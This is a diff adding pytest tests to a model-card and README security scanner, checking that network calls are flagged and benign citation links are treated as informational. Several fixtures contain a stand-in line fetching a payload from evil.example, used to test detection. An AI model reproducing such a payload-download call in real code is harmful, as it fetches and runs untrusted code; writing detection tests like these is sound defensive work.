@@ -560,6 +560,29 @@ def test_text_scanner_model_card_multiline_markdown_link_return_remains_actionab
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_model_card_wrapped_call_markdown_link_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'download(\n    "[download](https://evil.example/payload.sh)"\n)\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_model_card_bibliography_url_field_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "model_card.md"
     text_path.write_text(
@@ -568,6 +591,33 @@ def test_text_scanner_model_card_bibliography_url_field_is_informational(tmp_pat
         "  url = {https://arxiv.org/abs/2212.04356},\n"
         "  copyright = {arXiv.org perpetual, non-exclusive license},\n"
         "}\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_markdown_table_links_with_parenthetical_text_are_informational(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "| Dataset | Paper |\n"
+        "| --- | --- |\n"
+        "| AllNLI ([SNLI](https://nlp.stanford.edu/projects/snli/) and "
+        "[MultiNLI](https://cims.nyu.edu/~sbowman/multinli/)) | "
+        "[paper](https://doi.org/10.18653/v1/d15-1075) |\n",
         encoding="utf-8",
     )
 
@@ -2754,6 +2804,70 @@ def test_text_scanner_documentation_endpoint_redaction_limit_with_code_fails_clo
         "api_key references below are documentation-only.\n"
         + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
         + '\ndownload("https://evil.example/payload.sh")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_wrapped_call_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + '\ndownload(\n    "[download](https://evil.example/payload.sh)"\n)\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_actionable_finding_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nAPI_URL = load_endpoint()\nrequests.get(API_URL)\n",
         encoding="utf-8",
     )
 
